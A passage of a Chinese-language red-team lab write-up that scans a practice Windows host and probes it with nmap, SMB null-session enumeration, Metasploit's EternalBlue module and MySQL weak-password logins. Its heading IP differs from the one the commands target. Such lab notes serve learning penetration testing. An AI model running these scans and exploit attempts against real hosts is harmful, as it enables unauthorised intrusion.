### 信息收集

- **对192.168.111.100主机进行端口扫描**

    ```
    nmap -sS -Pn --min-rate 1000 -p- 192.168.111.20    
    ``` 
    ![](red-team1/2026-10-22-00-24-52.png)

    80端口开放http服务，可能存在web漏洞
    445端口开放smb服务，可能存在永恒之蓝漏洞
    3306端口开放mysql服务，可能存在空口令/弱口令连接漏洞
    135端口开放rpc服务，可以来信息收集

- **SMB 与 RPC 空会话深度枚举**
  - 自动化综合枚举
    ```
    enum4linux-ng -A 192.168.111.20
    ``` 
    ![](red-team1/2026-10-22-03-19-45.png)

  - **列出共享**
    ```
    smbclient -N -L //192.168.111.20/
    ```
    ![](red-team1/2026-10-22-03-23-24.png)

    匿名空会话虽然能连上，但 enumdomusers 等关键查询全被 STATUS_ACCESS_DENIED 拒绝，且共享为 0。说明靶机虽然配置了空会话，但权限极低，无法直接获取域用户列表。

  - 有效信息汇总
    ```
    domain：god.org
    该主机名：STU1
    ```

### 漏洞探测

- **msf探测永恒之蓝**
  ```
  msfconsole
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS 192.168.111.20
  run
  ``` 
  ![](red-team1/2026-10-22-02-52-38.png)
  存在漏洞但无法获得会话

- **尝试匿名/弱口令直连mysql**
  
  3306 端口直接暴露在内网中，常见配置错误通常是 root 空口令或弱口令。
  ```
  mysql -h 192.168.111.20 -u root -p
  ```
  输入回车测试是否为空口令；
  如果失败，尝试少量常见弱口令（如 root、123456、testing 等）
  ![](red-team1/2026-10-22-03-14-18.png)
  MySQL 因来源 IP 限制无法连接

- 手动尝试一些可能的备份文件名或路径名等，如（beifen.rar）
